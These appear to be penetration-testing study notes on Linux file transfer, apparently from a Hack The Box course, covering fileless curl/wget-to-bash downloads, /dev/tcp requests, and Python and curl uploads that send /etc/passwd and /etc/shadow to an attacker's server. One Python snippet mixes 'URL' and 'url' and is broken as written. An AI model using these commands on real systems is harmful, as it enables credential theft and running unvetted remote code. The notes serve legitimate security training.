# Transferring [[SSH Keys]]
```sh
# Encode SSH Key
aaryan11x@htb[/htb]$ cat id_rsa | base64 -w 0;echo

# Decode SSH key in attack box
aaryan11x@htb[/htb]$ echo -n '[base64_encode]' | base64 -d > id_rsa
# -n: Do not output the trailing newline
```
Also check for integrity of key using `md5sum`

---
# Fileless Download

```sh
# cURL
aaryan11x@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash

# wget
aaryan11x@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3

-q : Doesnt display progress bar 
-O : Downloaded content should be written to the terminal & not saved into a file


# Bash (/dev/tcp)
## Connect to the target webserver
aaryan11x@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80

## HTTP GET Request
aaryan11x@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3

## Print the Response
aaryan11x@htb[/htb]$ cat <&3


# SCP (Port 22)
## Enabling SSH Server
aaryan11x@htb[/htb]$ sudo systemctl enable ssh

## Starting SSH Server
aaryan11x@htb[/htb]$ sudo systemctl start ssh

## Check if Port 22 is Open
aaryan11x@htb[/htb]$ netstat -lnpt

(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      - 

## Then, use SCP from File Commands in Linux Fundamentals
```

---
# File Upload Methods
## Python
We can use `uploadserver`, an extended module of the Python `HTTP.Server` module, which includes a file upload page.
###### Method 1
```sh
# Install uploadserver Module
python3 -m pip install --user uploadserver

# Create a self-signed certificate
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

# Create directory for file hosting
mkdir https && cd https

# Start Web Server
python3 -m uploadserver 443 --server-certificate /root/server.pem

# Upload Multiple File (/etc/passwd & /etc/shadow)
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```


###### Method 2
```python
# To use the requests function, we need to import the module first.
import requests 

# Define the target URL where we will upload the file.
URL = "http://192.168.1.101:8000/upload"

# Define the file we want to read, open it and save it in a variable.
file = open("/etc/passwd","rb")

# Use a requests POST request to upload the file. 
r = requests.post(url,files={"files":file})


# One-liner for the above
python3 -c 'import requests;requests.post("http://192.168.1.101:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

---
# Transferring Files with Code
1) **Python**
```python
# Python 2.7
python2.7 -c 'import urllib;urllib.urlretrieve ("[URL]", "[Output_Filename]")'

# Python3
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```


2) **PHP**
```php
// Download with File_get_contents()
php -r '$file = file_get_contents("[URL]"); file_put_contents("LinEnum.sh",$file);'

// Download with Fopen()
php -r 'const BUFFER = 1024; $fremote = 
fopen("[URL]", "rb"); $flocal = fopen("[Output Filename]", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'

// Fileless Download
php -r '$lines = @file("[URL]"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

3) **Ruby & Perl**
```ruby
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("[URL]")))'
```
```perl
perl -e 'use LWP::Simple; getstore("[URL]", "LinEnum.sh");'
```


